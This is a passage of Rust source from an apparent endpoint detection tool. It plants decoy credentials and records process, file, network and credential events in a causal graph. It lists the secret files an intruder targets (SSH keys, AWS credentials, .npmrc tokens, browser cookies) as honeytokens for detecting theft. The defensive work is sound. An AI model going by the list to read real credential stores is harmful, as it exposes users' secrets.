        let Some(honey_host) = self.internal_hostname() else {
            return false;
        };
        let honey_host = normalize_hostname(honey_host);
        if honey_host.is_empty() {
            return false;
        }

        normalize_hostname(host) == honey_host
            || url
                .and_then(hostname_from_url_like)
                .map(|url_host| url_host == honey_host)
                .unwrap_or(false)
    }

    #[must_use]
    pub fn browser_cookie_indicators(&self) -> Vec<String> {
        if self.kind != HoneyArtifactKind::BrowserCookieJar {
            return Vec::new();
        }

        let mut indicators = vec![self.marker.clone()];
        if let Ok(value) = serde_json::from_str::<serde_json::Value>(&self.contents) {
            if let Some(cookies) = value.get("cookies").and_then(serde_json::Value::as_array) {
                for cookie in cookies {
                    let domain = cookie
                        .get("domain")
                        .and_then(serde_json::Value::as_str)
                        .filter(|value| !value.trim().is_empty());
                    let name = cookie
                        .get("name")
                        .and_then(serde_json::Value::as_str)
                        .filter(|value| !value.trim().is_empty());
                    let value = cookie
                        .get("value")
                        .and_then(serde_json::Value::as_str)
                        .filter(|value| !value.trim().is_empty());

                    if let Some(value) = value {
                        indicators.push(value.to_string());
                    }
                    if let Some(domain) = domain {
                        indicators.push(domain.to_string());
                    }
                    if let (Some(domain), Some(name)) = (domain, name) {
                        indicators.push(format!("{domain}/{name}"));
                    }
                    if let (Some(name), Some(value)) = (name, value) {
                        indicators.push(format!("{name}={value}"));
                    }
                }
            }
        }

        indicators.sort();
        indicators.dedup();
        indicators
    }

    #[must_use]
    pub fn matches_browser_cookie_access(&self, name: Option<&str>) -> bool {
        let Some(name) = name else {
            return false;
        };
        let observed = name.to_ascii_lowercase();
        self.browser_cookie_indicators()
            .into_iter()
            .map(|indicator| indicator.to_ascii_lowercase())
            .filter(|indicator| !indicator.is_empty())
            .any(|indicator| observed.contains(&indicator))
    }
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct DeceptionPlan {
    pub root: PathBuf,
    pub endpoint_id: String,
    pub artifacts: Vec<HoneyArtifact>,
}

impl DeceptionPlan {
    #[must_use]
    pub fn standard(root: impl Into<PathBuf>, endpoint_id: impl Into<String>) -> Self {
        let root = root.into();
        let endpoint_id = endpoint_id.into();
        let artifact_specs = [
            (HoneyArtifactKind::SshPrivateKey, ".ssh/id_prod_ed25519"),
            (
                HoneyArtifactKind::ApiTokenFile,
                ".config/clawdstrike/tokens/prod-api-token.txt",
            ),
            (HoneyArtifactKind::CloudCredentials, ".aws/credentials"),
            (HoneyArtifactKind::PackageRegistryToken, ".npmrc"),
            (
                HoneyArtifactKind::BrowserCookieJar,
                "Library/Application Support/ClawdStrike/Honey/Cookies.json",
            ),
            (
                HoneyArtifactKind::InternalHostname,
                ".config/clawdstrike/internal-hosts.txt",
            ),
        ];

        let artifacts = artifact_specs
            .into_iter()
            .map(|(kind, relative_path)| honey_artifact(&endpoint_id, kind, relative_path))
            .collect();

        Self {
            root,
            endpoint_id,
            artifacts,
        }
    }

    pub fn materialize(&self) -> Result<DeceptionMaterializationReport> {
        let mut created = Vec::new();
        let mut skipped = Vec::new();

        for artifact in &self.artifacts {
            ensure_safe_relative_path(&artifact.relative_path)?;
            let path = artifact.absolute_path(&self.root);
            let Some(parent) = path.parent() else {
                return Err(anyhow!(
                    "honey artifact path has no parent: {}",
                    path.display()
                ));
            };
            fs::create_dir_all(parent)
                .with_context(|| format!("create honey artifact directory {}", parent.display()))?;

            match create_new_honey_file(&path, artifact) {
                Ok(()) => created.push(path.display().to_string()),
                Err(err) if err.kind() == ErrorKind::AlreadyExists => {
                    skipped.push(path.display().to_string());
                }
                Err(err) => {
                    return Err(err)
                        .with_context(|| format!("create honey artifact {}", path.display()));
                }
            }
        }

        Ok(DeceptionMaterializationReport { created, skipped })
    }
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct DeceptionMaterializationReport {
    pub created: Vec<String>,
    pub skipped: Vec<String>,
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct DeceptionCleanupReport {
    pub dry_run: bool,
    pub removed: Vec<String>,
    pub would_remove: Vec<String>,
    pub missing: Vec<String>,
    pub refused: Vec<String>,
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct DeceptionRotationReport {
    pub dry_run: bool,
    pub cleanup: DeceptionCleanupReport,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub materialization: Option<DeceptionMaterializationReport>,
    pub deregistered_artifact_count: usize,
    pub registered_artifact_count: usize,
    pub remaining_registered_artifact_count: usize,
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum CausalNodeKind {
    Host,
    User,
    Session,
    Agent,
    Workload,
    Approval,
    Process,
    File,
    Network,
    DnsName,
    PackageScript,
    Credential,
    BrowserDownload,
    BrowserExtension,
    PolicyDecision,
    Tool,
    DeceptionArtifact,
    Other,
}

#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct CausalNode {
    pub node_id: String,
    pub kind: CausalNodeKind,
    pub label: String,
    pub first_seen: DateTime<Utc>,
    pub last_seen: DateTime<Utc>,
    #[serde(default)]
    pub attributes: BTreeMap<String, serde_json::Value>,
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum CausalEdgeKind {
    ObservedOn,
    RanAs,
    InSession,
    UsedAgent,
    UsedWorkload,
    AuthorizedBy,
    Spawned,
    Executed,
    Read,
    Wrote,
    Connected,
    ResolvedDns,
    RanScript,
    LoadedLibrary,
    CreatedPersistence,
    InstalledExtension,
    Downloaded,
    AccessedCredential,
    MadeDecision,
    TemporalNext,
    TouchedHoney,
    Related,
}

#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct CausalEdge {
    pub edge_id: String,
    pub from: String,
    pub to: String,
    pub kind: CausalEdgeKind,
    pub timestamp: DateTime<Utc>,
    pub observation_id: String,
    #[serde(default)]
    pub attributes: BTreeMap<String, serde_json::Value>,
}

#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize)]
#[serde(default, rename_all = "camelCase", deny_unknown_fields)]
pub struct CausalGraph {
    pub nodes: BTreeMap<String, CausalNode>,
    pub edges: Vec<CausalEdge>,
}

impl CausalGraph {
    #[must_use]
    pub fn causal_subgraph_from(&self, root_node_id: &str, max_depth: usize) -> Option<Self> {
        if !self.nodes.contains_key(root_node_id) {
            return None;
        }

        let mut node_ids = BTreeSet::from([root_node_id.to_string()]);
        let mut edge_ids = BTreeSet::new();
        let mut queue = VecDeque::from([(root_node_id.to_string(), 0usize)]);

        while let Some((node_id, depth)) = queue.pop_front() {
            if depth >= max_depth {
                continue;
            }

            for edge in self.edges.iter().filter(|edge| edge.from == node_id) {
                edge_ids.insert(edge.edge_id.clone());
                if node_ids.insert(edge.to.clone()) {
                    queue.push_back((edge.to.clone(), depth + 1));
                }
            }
        }

        let nodes = self
            .nodes
            .iter()
            .filter(|(node_id, _)| node_ids.contains(*node_id))
            .map(|(node_id, node)| (node_id.clone(), node.clone()))
            .collect();
        let edges = self
            .edges
            .iter()
            .filter(|edge| edge_ids.contains(&edge.edge_id))
            .cloned()
            .collect();

        Some(Self { nodes, edges })
    }

    #[must_use]
    pub fn causal_context_around(
        &self,
        root_node_id: &str,
        upstream_depth: usize,
        downstream_depth: usize,
    ) -> Option<Self> {
        if !self.nodes.contains_key(root_node_id) {
            return None;
        }

        let mut node_ids = BTreeSet::from([root_node_id.to_string()]);
        let mut edge_ids = BTreeSet::new();

        let mut upstream = VecDeque::from([(root_node_id.to_string(), 0usize)]);
        while let Some((node_id, depth)) = upstream.pop_front() {
            if depth >= upstream_depth {
                continue;
            }

            for edge in self.edges.iter().filter(|edge| edge.to == node_id) {
                edge_ids.insert(edge.edge_id.clone());
                if node_ids.insert(edge.from.clone()) {
                    upstream.push_back((edge.from.clone(), depth + 1));
                }
            }
        }

        let mut downstream = VecDeque::from([(root_node_id.to_string(), 0usize)]);
        while let Some((node_id, depth)) = downstream.pop_front() {
            if depth >= downstream_depth {
                continue;
            }

            for edge in self.edges.iter().filter(|edge| edge.from == node_id) {
                edge_ids.insert(edge.edge_id.clone());
                if node_ids.insert(edge.to.clone()) {
                    downstream.push_back((edge.to.clone(), depth + 1));
                }
            }
        }

        let nodes = self
            .nodes
            .iter()
            .filter(|(node_id, _)| node_ids.contains(*node_id))
            .map(|(node_id, node)| (node_id.clone(), node.clone()))
            .collect();
        let edges = self
            .edges
            .iter()
            .filter(|edge| edge_ids.contains(&edge.edge_id))
            .cloned()
            .collect();

        Some(Self { nodes, edges })
    }
}

#[derive(Clone, Debug, Default)]
pub struct CausalGraphRecorder {
    graph: CausalGraph,
    last_node_by_session: BTreeMap<String, String>,
    process_nodes: BTreeMap<String, String>,
}

impl CausalGraphRecorder {
    #[must_use]
    pub fn new() -> Self {
        Self::default()
    }

    #[must_use]
    pub fn graph(&self) -> &CausalGraph {
        &self.graph
    }

    pub fn into_graph(self) -> CausalGraph {
        self.graph
    }

    pub fn record_observation(&mut self, observation: &EndpointObservation) -> Vec<String> {
        let mut touched = Vec::new();
        let process_node = self.process_node(observation);
        touched.push(process_node.clone());
        touched.extend(self.identity_context_nodes(observation, &process_node));

        if let Some(parent_guid) = observation
            .process
            .parent_process_guid
            .as_deref()
            .map(str::trim)
            .filter(|value| !value.is_empty())
        {
            let parent = self.ensure_node(
                CausalNodeKind::Process,
                format!("process:{parent_guid}"),
                parent_guid.to_string(),
                observation.timestamp,
                BTreeMap::new(),
            );
            self.add_edge(
                parent,
                process_node.clone(),
                CausalEdgeKind::Spawned,
                observation,
                BTreeMap::new(),
            );
        }

        if let Some((event_node, edge_kind)) = self.event_node(observation) {
            self.add_edge(
                process_node,
                event_node.clone(),
                edge_kind,
                observation,
                BTreeMap::new(),
            );
            self.add_temporal_edge(observation, &event_node);
            touched.push(event_node);
        } else {
            self.add_temporal_edge(observation, &process_node);
        }

        touched
    }

    fn identity_context_nodes(
        &mut self,
        observation: &EndpointObservation,
        process_node: &str,
    ) -> Vec<String> {
        let mut touched = Vec::new();
        let posture = string_field(
            &observation.metadata,
            &["posture", "postureState", "posture_state"],
        );

        if let Some(host_id) = normalized_identity_value(observation.host_id.as_deref()) {
            let mut attributes = BTreeMap::new();
            insert_json(&mut attributes, "identityKind", "host");
            insert_json(&mut attributes, "hostId", &host_id);
            let node_id = self.ensure_node(
                CausalNodeKind::Host,
                format!("host:{host_id}"),
                host_id.clone(),
                observation.timestamp,
                attributes,
            );
            self.add_edge(
                node_id.clone(),
                process_node.to_string(),
                CausalEdgeKind::ObservedOn,
                observation,
                BTreeMap::new(),
            );
            touched.push(node_id);
        }

        if let Some(user_id) = normalized_identity_value(observation.user_id.as_deref()) {
            let mut attributes = BTreeMap::new();
            insert_json(&mut attributes, "identityKind", "user");
            insert_json(&mut attributes, "userId", &user_id);
            insert_json(&mut attributes, "hostId", &observation.host_id);
            let node_id = self.ensure_node(
                CausalNodeKind::User,
                format!("user:{user_id}"),
                user_id.clone(),
                observation.timestamp,
                attributes,
            );
            self.add_edge(
                node_id.clone(),
                process_node.to_string(),
                CausalEdgeKind::RanAs,
                observation,
                BTreeMap::new(),
            );
            touched.push(node_id);
        }

        if let Some(session_id) = normalized_identity_value(observation.session_id.as_deref()) {
            let mut attributes = BTreeMap::new();
            insert_json(&mut attributes, "identityKind", "session");
            insert_json(&mut attributes, "sessionId", &session_id);
            insert_json(&mut attributes, "hostId", &observation.host_id);
            insert_json(&mut attributes, "userId", &observation.user_id);
            insert_json(&mut attributes, "posture", &posture);
            let node_id = self.ensure_node(
                CausalNodeKind::Session,
                format!("session:{session_id}"),
                session_id.clone(),
                observation.timestamp,
                attributes,
            );
            self.add_edge(
                node_id.clone(),
                process_node.to_string(),
                CausalEdgeKind::InSession,
                observation,
                BTreeMap::new(),
            );
            touched.push(node_id);
        }

        if let Some(agent_id) = agent_id_field(&observation.metadata) {
            let mut attributes = BTreeMap::new();
            insert_json(&mut attributes, "identityKind", "agent");
            insert_json(&mut attributes, "agentId", &agent_id);
            insert_json(&mut attributes, "hostId", &observation.host_id);
            insert_json(&mut attributes, "sessionId", &observation.session_id);
            insert_json(&mut attributes, "posture", &posture);
            let node_id = self.ensure_node(
                CausalNodeKind::Agent,
                format!("agent:{agent_id}"),
                agent_id.clone(),
                observation.timestamp,
                attributes,
            );
            self.add_edge(
                node_id.clone(),
                process_node.to_string(),
                CausalEdgeKind::UsedAgent,
                observation,
                BTreeMap::new(),
            );
            touched.push(node_id);
        }

        if let Some(workload_id) = workload_id_field(&observation.metadata) {
            let mut attributes = BTreeMap::new();
            insert_json(&mut attributes, "identityKind", "workload");
            insert_json(&mut attributes, "workloadId", &workload_id);
            insert_json(&mut attributes, "hostId", &observation.host_id);
            insert_json(
                &mut attributes,
                "agentId",
                agent_id_field(&observation.metadata),
            );
            let node_id = self.ensure_node(
                CausalNodeKind::Workload,
                format!("workload:{workload_id}"),
                workload_id.clone(),
                observation.timestamp,
                attributes,
            );
            self.add_edge(
                node_id.clone(),
                process_node.to_string(),
                CausalEdgeKind::UsedWorkload,
                observation,
                BTreeMap::new(),
            );
            touched.push(node_id);
        }

        if let Some(approval_id) = approval_id_field(&observation.metadata) {
            let mut attributes = BTreeMap::new();
            insert_json(&mut attributes, "identityKind", "approval");
            insert_json(&mut attributes, "approvalId", &approval_id);
            insert_json(&mut attributes, "hostId", &observation.host_id);
            insert_json(
                &mut attributes,
                "agentId",
                agent_id_field(&observation.metadata),
            );
            insert_json(
                &mut attributes,
                "workloadId",
                workload_id_field(&observation.metadata),
            );
            let node_id = self.ensure_node(
                CausalNodeKind::Approval,
                format!("approval:{approval_id}"),
                approval_id.clone(),
                observation.timestamp,
                attributes,
            );
            self.add_edge(
                node_id.clone(),
                process_node.to_string(),
                CausalEdgeKind::AuthorizedBy,
                observation,
                BTreeMap::new(),
            );
            touched.push(node_id);
        }

        touched
    }

    #[must_use]
    pub fn causal_path(&self, from: &str, to: &str) -> Option<Vec<String>> {
        if from == to {
            return Some(vec![from.to_string()]);
        }

        let mut queue = VecDeque::from([from.to_string()]);
        let mut seen = BTreeSet::from([from.to_string()]);
        let mut previous: BTreeMap<String, String> = BTreeMap::new();

        while let Some(node) = queue.pop_front() {
            for edge in self.graph.edges.iter().filter(|edge| edge.from == node) {
                if !seen.insert(edge.to.clone()) {
                    continue;
                }
                previous.insert(edge.to.clone(), node.clone());
                if edge.to == to {
                    return Some(reconstruct_path(from, to, &previous));
                }
                queue.push_back(edge.to.clone());
            }
        }

        None
    }

    fn process_node(&mut self, observation: &EndpointObservation) -> String {
        let key = observation.process.stable_key();
        if let Some(node_id) = self.process_nodes.get(&key).cloned() {
            self.touch_node(&node_id, observation.timestamp);
            return node_id;
        }

        let label = observation
            .process
            .image
            .clone()
            .or_else(|| observation.process.command_line.clone())
            .unwrap_or_else(|| key.clone());
        let mut attributes = BTreeMap::new();
        insert_json(&mut attributes, "pid", observation.process.pid);
        insert_json(&mut attributes, "ppid", observation.process.ppid);
        insert_json(
            &mut attributes,
            "commandLine",
            &observation.process.command_line,
        );
        insert_json(&mut attributes, "cwd", &observation.process.cwd);
        insert_json(&mut attributes, "signing", &observation.process.signing);
        insert_json(&mut attributes, "hostId", &observation.host_id);
        insert_json(&mut attributes, "userId", &observation.user_id);
        insert_json(&mut attributes, "sessionId", &observation.session_id);
        insert_json(
            &mut attributes,
            "agentId",
            agent_id_field(&observation.metadata),
        );
        insert_json(
            &mut attributes,
            "workloadId",
            workload_id_field(&observation.metadata),
        );
        insert_json(
            &mut attributes,
            "approvalId",
            approval_id_field(&observation.metadata),
        );
        insert_json(
            &mut attributes,
            "toolCallId",
            tool_call_id_field(&observation.metadata),
        );
        insert_json(
            &mut attributes,
            "posture",
            string_field(
                &observation.metadata,
                &["posture", "postureState", "posture_state"],
            ),
        );

        let node_id = self.ensure_node(
            CausalNodeKind::Process,
            key.clone(),
            label,
            observation.timestamp,
            attributes,
        );
        self.process_nodes.insert(key, node_id.clone());
        node_id
    }

    fn event_node(
        &mut self,
        observation: &EndpointObservation,
    ) -> Option<(String, CausalEdgeKind)> {
        match &observation.event {
            EndpointEvent::ProcessExec { image, args, .. } => {
                let mut attributes = BTreeMap::new();
                insert_json(&mut attributes, "args", args);
                Some((
                    self.ensure_node(
                        CausalNodeKind::File,
                        format!("exec:{image}"),
                        image.clone(),
                        observation.timestamp,
                        attributes,
                    ),
                    CausalEdgeKind::Executed,
                ))
            }
            EndpointEvent::FileAccess {
                operation, path, ..
            } => Some((
                self.ensure_node(
                    CausalNodeKind::File,
                    format!("file:{}", normalize_path_string(path)),
                    path.clone(),
                    observation.timestamp,
                    BTreeMap::new(),
                ),
                match operation {
                    FileOperation::Write
                    | FileOperation::Create
                    | FileOperation::Delete
                    | FileOperation::Rename
                    | FileOperation::Chmod => CausalEdgeKind::Wrote,
                    _ => CausalEdgeKind::Read,
                },
            )),
            EndpointEvent::NetworkFlow {
                host,
                port,
                protocol,
                url,
            } => {
                let mut attributes = BTreeMap::new();
                insert_json(&mut attributes, "protocol", protocol);
                insert_json(&mut attributes, "url", url);
                Some((
                    self.ensure_node(
                        CausalNodeKind::Network,
                        format!("net:{host}:{port}"),
                        format!("{host}:{port}"),
                        observation.timestamp,
                        attributes,
                    ),
                    CausalEdgeKind::Connected,
                ))
            }
            EndpointEvent::DnsLookup {
                query,
                record_type,
                answers,
                resolver,
                status,
            } => {
                let mut attributes = BTreeMap::new();
                insert_json(&mut attributes, "recordType", record_type);
                insert_json(&mut attributes, "answers", answers);
                insert_json(&mut attributes, "resolver", resolver);
                insert_json(&mut attributes, "status", status);
                Some((
                    self.ensure_node(
                        CausalNodeKind::DnsName,
                        format!(
                            "dns:{}:{}",
                            normalize_hostname(query),
                            record_type.as_deref().unwrap_or_default()
                        ),
                        query.clone(),
                        observation.timestamp,
                        attributes,
                    ),
                    CausalEdgeKind::ResolvedDns,
                ))
            }
            EndpointEvent::PackageScript {
                manager,
                package,
                phase,
                script,
                ..
            } => {
                let mut attributes = BTreeMap::new();
                insert_json(&mut attributes, "manager", manager.as_str());
                insert_json(&mut attributes, "package", package);
                insert_json(&mut attributes, "phase", phase);
                insert_json(&mut attributes, "script", script);
                Some((
                    self.ensure_node(
                        CausalNodeKind::PackageScript,
                        format!("script:{}:{}:{script}", manager.as_str(), phase),
                        format!("{} {phase}", manager.as_str()),
                        observation.timestamp,
                        attributes,
                    ),
                    CausalEdgeKind::RanScript,
                ))
            }
            EndpointEvent::DylibLoad { path, .. } => Some((
                self.ensure_node(
                    CausalNodeKind::File,
                    format!("dylib:{}", normalize_path_string(path)),
                    path.clone(),
                    observation.timestamp,
                    BTreeMap::new(),
                ),
                CausalEdgeKind::LoadedLibrary,
            )),
            EndpointEvent::LaunchPersistence { path, label, .. } => {
                let mut attributes = BTreeMap::new();
                insert_json(&mut attributes, "label", label);
                Some((
                    self.ensure_node(
                        CausalNodeKind::File,
                        format!("launch:{}", normalize_path_string(path)),
                        path.clone(),
                        observation.timestamp,
                        attributes,
                    ),
                    CausalEdgeKind::CreatedPersistence,
                ))
            }
            EndpointEvent::BrowserExtensionInstall {
                browser,
                extension_id,
                path,
                ..
            } => {
                let mut attributes = BTreeMap::new();
                insert_json(&mut attributes, "browser", browser);
                insert_json(&mut attributes, "extensionId", extension_id);
                Some((
                    self.ensure_node(
                        CausalNodeKind::BrowserExtension,
                        format!(
                            "browser_extension:{browser}:{}",
                            normalize_path_string(path)
                        ),
                        path.clone(),
                        observation.timestamp,
                        attributes,
                    ),
                    CausalEdgeKind::InstalledExtension,
                ))
            }
            EndpointEvent::BrowserDownload {
                browser,
                path,
                source_url,
                content_hash,
                byte_count,
            } => {
                let mut attributes = BTreeMap::new();
                insert_json(&mut attributes, "browser", browser);
                insert_json(&mut attributes, "sourceUrl", source_url);
                insert_json(&mut attributes, "contentHash", content_hash);
                insert_json(&mut attributes, "byteCount", byte_count);
                Some((
                    self.ensure_node(
                        CausalNodeKind::BrowserDownload,
                        format!("download:{}", normalize_path_string(path)),
                        path.clone(),
                        observation.timestamp,
                        attributes,
                    ),
                    CausalEdgeKind::Downloaded,
                ))
            }
            EndpointEvent::CredentialAccess { kind, path, name } => {
                let key = path
                    .clone()
                    .or_else(|| name.clone())
                    .unwrap_or_else(|| kind.as_str().to_string());
                let mut attributes = BTreeMap::new();
                insert_json(&mut attributes, "credentialKind", kind.as_str());
                insert_json(&mut attributes, "path", path);
                insert_json(&mut attributes, "name", name);
                Some((
                    self.ensure_node(
                        CausalNodeKind::Credential,
                        format!("credential:{key}"),
                        key,
                        observation.timestamp,
                        attributes,
                    ),
                    CausalEdgeKind::AccessedCredential,
                ))
            }
            EndpointEvent::ToolCall {
                tool_name,
                parameters,
            } => {
                let mut attributes = BTreeMap::new();
                insert_json(&mut attributes, "parameters", parameters);
                insert_json(
                    &mut attributes,
                    "toolCallId",
                    tool_call_id_field(&observation.metadata),
                );
                Some((
                    self.ensure_node(
                        CausalNodeKind::Tool,
                        format!("tool:{tool_name}"),
                        tool_name.clone(),
                        observation.timestamp,
                        attributes,
                    ),
                    CausalEdgeKind::Related,
                ))
            }
            EndpointEvent::PolicyDecision {
                action,
                target,
                decision,
                guard,
                severity,
            } => {
                let mut attributes = BTreeMap::new();
                insert_json(&mut attributes, "target", target);
                insert_json(&mut attributes, "decision", decision);
                insert_json(&mut attributes, "guard", guard);
                insert_json(&mut attributes, "severity", severity);
                Some((
                    self.ensure_node(
                        CausalNodeKind::PolicyDecision,
                        format!(
                            "decision:{}:{}:{}",
                            action,
                            target.as_deref().unwrap_or_default(),
                            decision
                        ),
                        format!("{action} {decision}"),
                        observation.timestamp,
                        attributes,
                    ),
                    CausalEdgeKind::MadeDecision,
                ))
            }
            EndpointEvent::Other { category, fields } => {
                let mut attributes = BTreeMap::new();
                insert_json(&mut attributes, "fields", fields);
                Some((
                    self.ensure_node(
                        CausalNodeKind::Other,
                        format!("other:{category}:{}", observation.observation_id),
                        category.clone(),
                        observation.timestamp,
                        attributes,
                    ),
                    CausalEdgeKind::Related,
                ))
            }
        }
    }

    fn add_temporal_edge(&mut self, observation: &EndpointObservation, node_id: &str) {
        let Some(session_id) = observation.session_id.as_deref() else {
            return;
        };
        if let Some(previous) = self.last_node_by_session.get(session_id).cloned() {
            if previous != node_id {
                self.add_edge(
                    previous,
                    node_id.to_string(),
                    CausalEdgeKind::TemporalNext,
                    observation,
                    BTreeMap::new(),
                );
            }
        }
        self.last_node_by_session
            .insert(session_id.to_string(), node_id.to_string());
    }

    fn ensure_node(
        &mut self,
        kind: CausalNodeKind,
        key: String,
        label: String,
        timestamp: DateTime<Utc>,
        attributes: BTreeMap<String, serde_json::Value>,
    ) -> String {
        let node_id = stable_id("node", [key.as_str()]);
        if let Some(existing) = self.graph.nodes.get_mut(&node_id) {
            existing.last_seen = timestamp;
            for (key, value) in attributes {
                existing.attributes.entry(key).or_insert(value);
            }
            return node_id;
        }

        self.graph.nodes.insert(
            node_id.clone(),
            CausalNode {
                node_id: node_id.clone(),
                kind,
                label,
                first_seen: timestamp,
                last_seen: timestamp,
                attributes,
            },
        );
        node_id
    }

    fn touch_node(&mut self, node_id: &str, timestamp: DateTime<Utc>) {
        if let Some(node) = self.graph.nodes.get_mut(node_id) {
            node.last_seen = timestamp;
        }
    }

    fn add_edge(
        &mut self,
        from: String,
        to: String,
        kind: CausalEdgeKind,
        observation: &EndpointObservation,
        mut attributes: BTreeMap<String, serde_json::Value>,
    ) {
        insert_json(&mut attributes, "eventKind", observation.event.kind_name());
        insert_json(&mut attributes, "hostId", &observation.host_id);
        insert_json(&mut attributes, "userId", &observation.user_id);
        insert_json(&mut attributes, "sessionId", &observation.session_id);
        insert_json(
            &mut attributes,
            "agentId",
            agent_id_field(&observation.metadata),
        );
        insert_json(
            &mut attributes,
            "workloadId",
            workload_id_field(&observation.metadata),
        );
        insert_json(
            &mut attributes,
            "approvalId",
            approval_id_field(&observation.metadata),
        );
        insert_json(
            &mut attributes,
            "toolCallId",
            tool_call_id_field(&observation.metadata),
        );
        let kind_key = format!("{kind:?}");
        let edge_id = stable_id(
            "edge",
            [
                from.as_str(),
                to.as_str(),
                kind_key.as_str(),
                observation.observation_id.as_str(),
            ],
        );
        if self.graph.edges.iter().any(|edge| edge.edge_id == edge_id) {
            return;
        }
        self.graph.edges.push(CausalEdge {
            edge_id,
            from,
            to,
            kind,
            timestamp: observation.timestamp,
            observation_id: observation.observation_id.clone(),
            attributes,
        });
    }
}

pub const ENDPOINT_DECISION_RECEIPT_SCHEMA_VERSION: &str = "clawdstrike.endpoint_decision.v1";

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum EndpointDecisionReceiptFamily {
    SensorState,
    ProviderDegradation,
    Observation,
    PolicyDecision,
    PolicyDelta,
    GraphSlice,
    #[default]
    Detection,
    Simulation,
    ResponseRequest,
    ResponseExecution,
    ResponseRollback,
    ResponseAcknowledgement,
    DeceptionMaterialization,
    DeceptionCleanup,
    DeceptionRotation,
    EvidenceBundleManifest,
    PrivacyReport,
}

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum EndpointProviderKind {
    #[default]
    AgentApi,
    EndpointSecurity,
    NetworkExtension,
    DarwinBridge,
    PolicyEngine,
    ResponseExecutor,
    Other,
}

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default, rename_all = "camelCase", deny_unknown_fields)]
pub struct EndpointProviderState {
    pub provider_id: String,
    pub provider_kind: EndpointProviderKind,
    pub installed: bool,
    pub active: bool,
    pub healthy: bool,
    pub degraded: bool,
    pub degradation_reasons: Vec<String>,
    pub dropped_event_count: u64,
    pub deadline_miss_count: u64,
    pub full_disk_access: Option<bool>,
    pub last_seen: Option<DateTime<Utc>>,
}

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default, rename_all = "camelCase", deny_unknown_fields)]
pub struct EndpointSensorState {
    pub providers: Vec<EndpointProviderState>,
}

impl EndpointSensorState {
    #[must_use]
    pub fn single_active_agent(provider_id: impl Into<String>) -> Self {
        Self {
            providers: vec![EndpointProviderState {
                provider_id: provider_id.into(),
                provider_kind: EndpointProviderKind::AgentApi,
                installed: true,
                active: true,
                healthy: true,
                degraded: false,
                degradation_reasons: Vec::new(),
                dropped_event_count: 0,
                deadline_miss_count: 0,
                full_disk_access: None,
                last_seen: Some(Utc::now()),
            }],
        }
    }
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default, rename_all = "camelCase", deny_unknown_fields)]
pub struct EndpointClockState {
    pub captured_at: DateTime<Utc>,
    pub source: String,
    pub synchronized: Option<bool>,
    pub uncertainty_ms: Option<u64>,
}

impl Default for EndpointClockState {
    fn default() -> Self {
        Self {
            captured_at: Utc::now(),
            source: "system".to_string(),
            synchronized: None,
            uncertainty_ms: None,
        }
    }
}

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default, rename_all = "camelCase", deny_unknown_fields)]
pub struct EndpointDecisionActor {
    pub endpoint_id: String,
    pub host_id: Option<String>,
    pub user_id: Option<String>,
    pub session_id: Option<String>,
    pub posture: Option<String>,
    pub agent_id: Option<String>,
    pub workload_id: Option<String>,
    pub approval_id: Option<String>,
}

impl EndpointDecisionActor {
    #[must_use]
    pub fn from_observation(
        endpoint_id: impl Into<String>,
        observation: &EndpointObservation,
    ) -> Self {
        Self {
            endpoint_id: endpoint_id.into(),
            host_id: observation.host_id.clone(),
            user_id: observation.user_id.clone(),
            session_id: observation.session_id.clone(),
            posture: string_field(
                &observation.metadata,
                &["posture", "postureState", "posture_state"],
            ),
            agent_id: agent_id_field(&observation.metadata),
            workload_id: workload_id_field(&observation.metadata),
            approval_id: approval_id_field(&observation.metadata),
        }
    }

    #[must_use]
    pub fn with_endpoint_id(endpoint_id: impl Into<String>) -> Self {
        Self {
            endpoint_id: endpoint_id.into(),
            ..Self::default()
        }
    }

    #[must_use]
    pub fn with_endpoint_id_if_missing(mut self, endpoint_id: impl Into<String>) -> Self {
        if self.endpoint_id.trim().is_empty() {
            self.endpoint_id = endpoint_id.into();
        }
        self
    }
}

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default, rename_all = "camelCase", deny_unknown_fields)]
pub struct EndpointPolicySnapshot {
    pub policy_version: String,
    pub policy_hash: String,
    pub policy_epoch: u64,
}

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default, rename_all = "camelCase", deny_unknown_fields)]
pub struct EndpointReceiptSigner {
    pub signer_identity: String,
    pub signer_public_key: Option<String>,
}

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum EndpointDecisionAction {
    Allow,
    Observe,
    Warn,
    #[default]
    Alert,
    Block,
    RestrictEgress,
    SuspendProcessTree,
    TerminateProcessTree,
    QuarantineFile,
    RevokeGrant,
    DisablePersistence,
    CollectEvidence,
}

impl EndpointDecisionAction {
    #[must_use]
    pub fn as_str(&self) -> &'static str {
        match self {
            Self::Allow => "allow",
            Self::Observe => "observe",
            Self::Warn => "warn",
            Self::Alert => "alert",
            Self::Block => "block",
